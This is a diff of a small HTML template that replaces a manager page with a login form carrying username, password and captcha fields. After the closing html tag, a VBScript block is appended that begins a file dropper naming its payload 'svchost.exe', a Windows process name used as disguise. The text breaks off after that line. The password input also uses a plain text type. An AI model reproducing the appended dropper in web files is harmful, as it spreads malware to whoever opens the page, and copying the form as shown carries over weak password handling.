@@ -2,11 +2,23 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>manager</title>
+    <title>login</title>
 </head>
 <body>
-<span><a href="/logout">退出</a></span>
-<h1>manager page</h1>
+<form action="/login" method="post">
+    <p><input type="text" placeholder="username" name="username"></p>
+    <p><input type="text" placeholder="password" name="pwd"></p>
+    <p><input type="text" placeholder="checkcode" name="checkcode"><img src="/checkcode" onclick='ChangeCode();' id='imgCode'></p>
+
+    <input type="submit">
+</form>
+    <script type="text/javascript">
+
+        function ChangeCode() {
+            var code = document.getElementById('imgCode');
+            code.src += '?';
+        }
+    </script>
 </body>
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
